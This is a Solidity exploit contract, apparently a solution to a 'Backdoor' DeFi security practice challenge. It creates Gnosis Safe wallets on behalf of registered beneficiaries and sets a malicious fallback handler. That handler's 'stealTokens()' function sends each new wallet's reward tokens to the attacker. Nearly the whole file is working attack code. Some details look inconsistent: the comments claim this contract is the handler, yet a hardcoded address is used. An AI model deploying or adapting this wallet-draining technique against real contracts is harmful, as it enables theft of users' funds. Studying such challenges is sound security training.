// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IProxyCreationCallback } from "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

interface IGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

interface IGnosisSafeProxyFactory {
    function proxyCreationCode() external pure returns (bytes memory);

    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (address proxy);
}

contract BackdoorExploiter {

    event RewardsStolen(address victim);

    IGnosisSafeProxyFactory immutable factory;
    address immutable singleton;
    address immutable walletRegistry;
    IERC20 immutable dvt;
    address immutable player;

    constructor(address _singleton, address _walletRegistry, address _dvt, address _factory, address[] memory _beneficiaries) {
        factory = IGnosisSafeProxyFactory(_factory);
        singleton = _singleton;
        walletRegistry = _walletRegistry;
        dvt = IERC20(_dvt);
        player = msg.sender;

        attack(_beneficiaries);
    }

    function attack(address[] memory _beneficiaries) public {
        require(msg.sender == player);

        for(uint i = 0; i < 1;) {

            address[] memory owners = new address[](1);
            owners[0] = _beneficiaries[i];

            bytes memory initializer = abi.encodeWithSelector(0xb63e800d,
                owners, // _owners[]
                1, // _threshold
                address(0), // to
                "", // data
                0x0116686E2291dbd5e317F47faDBFb43B599786Ef, // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );

            // 2. create the wallet for the victim by setting this contract as the fallbackHandler
            address wallet = factory.createProxyWithCallback(
                singleton,
                initializer,
                i,
                IProxyCreationCallback(walletRegistry)
            );
            console.log("wallet created: ", wallet);
            console.log("wallet balance: ", dvt.balanceOf(wallet));
            require(wallet != address(0), "Deployment Failed");

            // 3. using the FallbackHandler to steal reward tokens since the walletRegistry has already given rewards
            // up to this point
            (bool ok, ) = wallet.call(abi.encodeWithSignature("stealTokens()"));
            require(ok, "Token stealing failed");

            unchecked { ++i; }
        }
    }

    // this will be called as the FallbackHandler (with DELEGATECALL) and will transfer the rewards
    // from the wallet to the player
    function stealTokens() external {
        console.log("entered here as %s", msg.sender);
        uint256 amount = dvt.balanceOf(msg.sender);
        dvt.transfer(player, amount);
        emit RewardsStolen(msg.sender);
    }

}
